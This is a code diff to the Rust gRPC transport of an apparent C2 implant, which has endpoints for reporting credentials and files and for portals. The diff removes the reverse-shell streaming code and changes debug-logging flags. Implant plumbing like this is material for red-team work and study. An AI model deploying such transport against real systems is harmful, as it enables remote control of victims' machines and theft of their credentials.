@@ -108,7 +108,6 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 #[allow(clippy::upper_case_acronyms)]
@@ -226,7 +225,7 @@ impl Transport for GRPC {
         request: FetchAssetRequest,
         tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         let filename = request.name.clone();
         let resp = self.fetch_asset_impl(request).await?;
         let mut stream = resp.into_inner();
@@ -241,7 +240,7 @@ impl Transport for GRPC {
                         }
                     },
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to download file: {}: {}", filename, _err);
 
                         return;
@@ -250,7 +249,7 @@ impl Transport for GRPC {
                 match tx.send(msg) {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!(
                             "failed to send downloaded file chunk: {}: {}",
                             filename,
@@ -299,44 +298,6 @@ impl Transport for GRPC {
         Ok(resp.into_inner())
     }
 
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        // Wrap PTY output receiver in stream
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
-
-        // Open gRPC Bi-Directional Stream
-        let resp = self.reverse_shell_impl(req_stream).await?;
-        let mut resp_stream = resp.into_inner();
-
-        // Spawn task to deliver PTY input
-        tokio::spawn(async move {
-            while let Some(msg) = match resp_stream.message().await {
-                Ok(m) => m,
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("failed to receive gRPC stream response: {}", _err);
-
-                    None
-                }
-            } {
-                match tx.send(msg).await {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to queue pty input: {}", _err);
-
-                        return;
-                    }
-                }
-            }
-        });
-
-        Ok(())
-    }
-
     async fn create_portal(
         &mut self,
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
@@ -354,7 +315,7 @@ impl Transport for GRPC {
             while let Some(msg) = match resp_stream.message().await {
                 Ok(m) => m,
                 Err(_err) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to receive gRPC stream response: {}", _err);
 
                     None
@@ -363,7 +324,7 @@ impl Transport for GRPC {
                 match tx.send(msg).await {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to queue portal input: {}", _err);
 
                         return;
@@ -428,13 +389,13 @@ impl Transport for GRPC {
             while let Some(msg) = match resp_stream.message().await {
                 Ok(m) => m,
                 Err(_err) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to receive gRPC stream response: {}", _err);
                     None
                 }
             } {
                 if tx.send(msg).await.is_err() {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to queue remote input");
                     return;
                 }
@@ -624,37 +585,6 @@ impl GRPC {
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
         self.grpc.as_mut().unwrap().unary(req, path, codec).await
-    }
-
-    async fn reverse_shell_impl(
-        &mut self,
-        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
-        tonic::Status,
-    > {
-        if self.grpc.is_none() {
-            return Err(tonic::Status::new(
-                tonic::Code::FailedPrecondition,
-                "grpc client not created".to_string(),
-            ));
-        }
-        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
-        })?;
-        let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
-        let mut req = request.into_streaming_request();
-        req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
-        self.grpc
-            .as_mut()
-            .unwrap()
-            .streaming(req, path, codec)
-            .await
     }
 
     async fn create_portal_impl(
